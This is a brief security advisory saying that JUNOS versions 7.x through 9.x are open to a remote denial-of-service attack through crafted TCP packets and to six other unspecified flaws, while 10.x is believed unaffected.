JUNOS is prone to a remote denial-of-service vulnerability that arises when the application handles specially crafted TCP packets.

JUNOS is also prone to six other unspecified security vulnerabilities. These issues may include privilege-escalation or denial-of-service issues.

JUNOS 7.x, 8.x, and 9.x are affected. JUNOS 10.x is not believed to be affected.
